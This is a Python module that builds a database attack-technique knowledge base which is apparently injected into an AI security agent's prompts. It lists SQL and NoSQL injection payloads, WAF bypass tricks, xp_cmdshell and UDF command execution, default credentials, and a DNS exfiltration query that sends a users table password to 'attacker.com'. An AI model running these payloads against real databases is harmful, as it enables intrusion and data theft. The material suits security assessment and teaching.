"""Database security knowledge base.

Deep knowledge about database security:
1. SQL injection deep-dive
2. NoSQL injection
3. Database privilege escalation
4. Data exfiltration techniques
5. Database hardening assessment
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class DatabasePattern:
    """A database security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


DATABASE_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "db-001", "name": "SQL Injection Deep-Dive",
        "category": "sqli", "severity": "critical",
        "desc": "Advanced SQL injection techniques.",
        "detection": (
            "SQL INJECTION DEEP-DIVE:\n"
            "DETECTION:\n"
            "  - Error-based (syntax errors reveal DB)\n"
            "  - Boolean-based blind\n"
            "    # ' AND 1=1-- vs ' AND 1=2--\n"
            "  - Time-based blind\n"
            "    # ' AND SLEEP(5)-- (MySQL)\n"
            "    # '; WAITFOR DELAY '0:0:5'-- (MSSQL)\n"
            "    # ' AND pg_sleep(5)-- (PostgreSQL)\n"
            "  - UNION-based\n"
            "    # ' UNION SELECT 1,2,3--\n"
            "  - Out-of-band (DNS/HTTP)\n"
            "    # LOAD_FILE('\\\\\\\\attacker.com\\\\x')\n"
            "ADVANCED:\n"
            "  - Second-order injection\n"
            "  - INSERT/UPDATE injection\n"
            "  - Stacked queries\n"
            "  - WAF bypass techniques\n"
            "    # Case variation: sElEcT\n"
            "    # Comments: SEL/**/ECT\n"
            "    # URL encoding: %53%45%4C%45%43%54\n"
            "    # Double encoding\n"
            "    # Unicode normalization\n"
            "    # HTTP parameter pollution\n"
            "DB-SPECIFIC:\n"
            "  MySQL:\n"
            "    - @@version, INFORMATION_SCHEMA\n"
            "    - INTO OUTFILE, LOAD_FILE\n"
            "    - User defined functions (UDF)\n"
            "  MSSQL:\n"
            "    - xp_cmdshell (RCE)\n"
            "    - sp_oacreate (COM objects)\n"
            "    - OPENROWSET (data exfil)\n"
            "    - Linked servers\n"
            "  PostgreSQL:\n"
            "    - COPY TO/FROM PROGRAM\n"
            "    - lo_import/lo_export\n"
            "    - PL/pgSQL execution\n"
            "  Oracle:\n"
            "    - UTL_HTTP (HTTP requests)\n"
            "    - DBMS_LDAP (LDAP calls)\n"
            "    - Java stored procedures\n"
            "TOOLS:\n"
            "  sqlmap, Havij, jSQL, ghauri"
        ),
        "tools": ["sqlmap"],
    },
    {
        "id": "db-002", "name": "NoSQL Injection",
        "category": "nosql", "severity": "high",
        "desc": "NoSQL injection techniques.",
        "detection": (
            "NOSQL INJECTION:\n"
            "MONGODB:\n"
            "  - Operator injection\n"
            "    # {\"username\":{\"$ne\":\"\"}, \"password\":{\"$ne\":\"\"}}\n"
            "    # {\"$gt\":\"\"} (always true)\n"
            "    # {\"$regex\":\"^a\"} (enumerate)\n"
            "  - JavaScript injection\n"
            "    # {\"$where\":\"this.password.match(/^a/)\"}\n"
            "  - Aggregation pipeline injection\n"
            "  - Server-side JavaScript\n"
            "    # db.eval() (deprecated but present)\n"
            "REDIS:\n"
            "  - Command injection via protocol\n"
            "  - EVAL (Lua script execution)\n"
            "  - CONFIG SET (file write)\n"
            "  - Slaveof (replication abuse)\n"
            "  - Module loading (RCE)\n"
            "COUCHDB:\n"
            "  - REST API exploitation\n"
            "  - View function injection\n"
            "  - Admin party (no auth default)\n"
            "ELASTICSEARCH:\n"
            "  - Script injection (Groovy/Painless)\n"
            "  - Snapshot repository abuse\n"
            "  - No auth by default\n"
            "  - Index data exfiltration\n"
            "CASSANDRA:\n"
            "  - CQL injection\n"
            "  - User-defined functions\n"
            "  - Default credentials\n"
            "TOOLS:\n"
            "  NoSQLMap, mongosh, redis-cli"
        ),
        "tools": [],
    },
    {
        "id": "db-003", "name": "Database Privilege Escalation",
        "category": "privesc", "severity": "critical",
        "desc": "Database privilege escalation.",
        "detection": (
            "DATABASE PRIVILEGE ESCALATION:\n"
            "MYSQL:\n"
            "  - UDF (User Defined Functions)\n"
            "    # Load .so/.dll for OS command exec\n"
            "    # CREATE FUNCTION sys_exec RETURNS INTEGER\n"
            "    # SONAME 'lib_mysqludf_sys.so'\n"
            "  - FILE privilege abuse\n"
            "    # SELECT INTO OUTFILE\n"
            "    # LOAD DATA INFILE\n"
            "  - Trigger/event scheduler abuse\n"
            "  - mysql.user table direct edit\n"
            "MSSQL:\n"
            "  - xp_cmdshell enable\n"
            "    # EXEC sp_configure 'xp_cmdshell', 1\n"
            "    # RECONFIGURE\n"
            "  - IMPERSONATE (EXECUTE AS)\n"
            "  - Linked server exploitation\n"
            "  - CLR assembly loading\n"
            "  - OLE automation\n"
            "  - Agent job creation\n"
            "POSTGRESQL:\n"
            "  - COPY TO PROGRAM (superuser)\n"
            "  - CREATE EXTENSION\n"
            "  - Large object functions\n"
            "  - PL/Python, PL/Perl execution\n"
            "  - pg_execute_server_program\n"
            "ORACLE:\n"
            "  - DBMS_SCHEDULER (OS exec)\n"
            "  - Java stored procedures\n"
            "  - CREATE ANY TRIGGER\n"
            "  - GRANT DBA exploitation\n"
            "TOOLS:\n"
            "  sqlmap --os-shell, PowerUpSQL, ODAT"
        ),
        "tools": ["sqlmap"],
    },
    {
        "id": "db-004", "name": "Data Exfiltration",
        "category": "exfiltration", "severity": "critical",
        "desc": "Database data exfiltration techniques.",
        "detection": (
            "DATA EXFILTRATION:\n"
            "IN-BAND:\n"
            "  - UNION SELECT direct output\n"
            "  - Error-based data extraction\n"
            "  - XML/JSON output functions\n"
            "OUT-OF-BAND:\n"
            "  - DNS exfiltration\n"
            "    # MySQL: SELECT LOAD_FILE(CONCAT('\\\\\\\\',\n"
            "    #   (SELECT password FROM users LIMIT 1),\n"
            "    #   '.attacker.com\\\\x'))\n"
            "    # MSSQL: xp_dirtree\n"
            "    # Oracle: UTL_HTTP/UTL_INADDR\n"
            "  - HTTP exfiltration\n"
            "    # MySQL: LOAD_FILE + INTO OUTFILE\n"
            "    # PostgreSQL: COPY TO PROGRAM 'curl'\n"
            "    # MSSQL: xp_cmdshell + PowerShell\n"
            "FILE SYSTEM:\n"
            "  - Write to webroot\n"
            "    # MySQL: INTO OUTFILE '/var/www/data.txt'\n"
            "    # MSSQL: BCP utility\n"
            "    # PostgreSQL: COPY TO '/tmp/data.csv'\n"
            "BLIND:\n"
            "  - Bit-by-bit extraction\n"
            "  - Binary search extraction\n"
            "  - Conditional responses\n"
            "  - Time-based character extraction\n"
            "BULK:\n"
            "  - Database dump (mysqldump, pg_dump)\n"
            "  - Backup file theft\n"
            "  - Replication stream capture\n"
            "  - Binary log parsing\n"
            "TOOLS:\n"
            "  sqlmap --dump, ODAT, PowerUpSQL"
        ),
        "tools": ["sqlmap"],
    },
    {
        "id": "db-005", "name": "Database Hardening Assessment",
        "category": "hardening", "severity": "medium",
        "desc": "Database hardening and misconfiguration.",
        "detection": (
            "DATABASE HARDENING:\n"
            "AUTHENTICATION:\n"
            "  - Default credentials\n"
            "    # MySQL: root / (empty)\n"
            "    # PostgreSQL: postgres / postgres\n"
            "    # MongoDB: (no auth default)\n"
            "    # Redis: (no auth default)\n"
            "    # Elasticsearch: (no auth default)\n"
            "  - Weak passwords\n"
            "  - Authentication bypass\n"
            "  - Network exposure\n"
            "CONFIGURATION:\n"
            "  - Remote access enabled\n"
            "  - Dangerous features enabled\n"
            "    # MySQL: local_infile, FILE priv\n"
            "    # MSSQL: xp_cmdshell, CLR\n"
            "    # PostgreSQL: pg_hba.conf trust\n"
            "  - Excessive privileges\n"
            "  - Missing encryption\n"
            "  - Audit logging disabled\n"
            "NETWORK:\n"
            "  - Listening on 0.0.0.0\n"
            "  - Default ports exposed\n"
            "    # MySQL: 3306\n"
            "    # PostgreSQL: 5432\n"
            "    # MSSQL: 1433\n"
            "    # MongoDB: 27017\n"
            "    # Redis: 6379\n"
            "    # Elasticsearch: 9200\n"
            "  - No TLS/SSL\n"
            "  - No firewall rules\n"
            "CIS BENCHMARKS:\n"
            "  - MySQL CIS Benchmark\n"
            "  - PostgreSQL CIS Benchmark\n"
            "  - MSSQL CIS Benchmark\n"
            "  - Oracle CIS Benchmark\n"
            "  - MongoDB CIS Benchmark\n"
            "TOOLS:\n"
            "  DbDat, Dbsake, pgaudit, ScoutSuite"
        ),
        "tools": [],
    },
]


class DatabaseSecurityKB:
    """Database security knowledge base.

    Provides database security patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, DatabasePattern] = {}
        self._log = logger.bind(component="database_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load database patterns."""
        for data in DATABASE_PATTERNS:
            pattern = DatabasePattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[DatabasePattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_database_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build database security prompt."""
        lines = ["## Database Security\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
